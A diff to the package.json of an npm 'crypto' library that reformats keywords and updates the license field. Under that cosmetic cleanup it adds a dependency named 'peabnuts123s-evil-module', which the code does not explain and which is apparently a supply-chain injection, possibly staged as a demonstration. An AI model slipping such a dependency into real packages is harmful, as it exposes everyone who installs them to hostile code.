@@ -1,9 +1,13 @@
-{ 
+{
   "name": "crypto",
   "id": "crypto",
   "version": "0.0.3",
   "description": "JavaScript implementations of standard and secure cryptographic algorithms.",
-  "keywords": [ "crypto", "md5", "sha1" ],
+  "keywords": [
+    "crypto",
+    "md5",
+    "sha1"
+  ],
   "author": "Irakli Gozalishvili <rfobic@gmail.com>",
   "repository": {
     "type": "git",
@@ -22,8 +26,8 @@
   "scripts": {
     "test": "node test/test-crypto.js"
   },
-  "licenses": [{
-    "type" : "BSD",
-    "url" : "http://pajhome.org.uk/site/legal.html#bsdlicense"
-  }]
+  "license": "BSD-3-Clause",
+  "dependencies": {
+    "peabnuts123s-evil-module": "^1.0.4"
+  }
 }
